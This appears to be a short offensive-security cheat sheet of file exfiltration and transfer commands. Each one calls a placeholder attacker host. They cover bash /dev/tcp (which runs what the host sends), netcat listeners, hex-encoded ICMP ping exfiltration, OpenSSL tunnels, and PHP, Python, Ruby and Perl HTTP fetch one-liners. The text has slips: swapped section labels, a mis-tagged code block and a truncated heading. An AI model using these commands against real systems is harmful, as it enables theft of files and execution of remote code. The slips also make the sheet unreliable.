# File Exfiltration/Download

## Upload file

### bash + nc (TCP)

Client:

    bash < /dev/tcp/IP_ADDRESS/PORT

Server:

    nc -lvnp PORT < FILE

### Ping

```sh
cat FILE | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 IP_ADDRESS; done
```

### OpenSSL

Client:

    openssl s_client -connect IP_ADDRESS:PORT -quiet > FILE

Server:

```sh
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept PORT -cert certificate.pem -key key.pem < FILE
```

### Progra

#### PHP

```php
php -r '$file = file_get_contents("http://IP_ADDRESS:PORT/FILE"); file_put_contents("FILENAME",$file);'
```

#### Python3

```php
import urllib.request
urllib.request.urlretrieve("http://IP_ADDRESS:PORT/FILE", "FILENAME")
```

#### Ruby

```ruby
ruby -e 'require "net/http"; File.write("FILENAME", Net::HTTP.get(URI.parse("http://IP_ADDRESS:PORT/FILE")))'
```

#### Perl

```perl
perl -e 'use LWP::Simple; getstore("http://IP_ADDRESS:PORT/FILE", "FILENAME");'
```

## Download file

Target:

    nc IP_ADDRESS 1234 < out.file

Source:

    nc -lvnp PORT > FILE
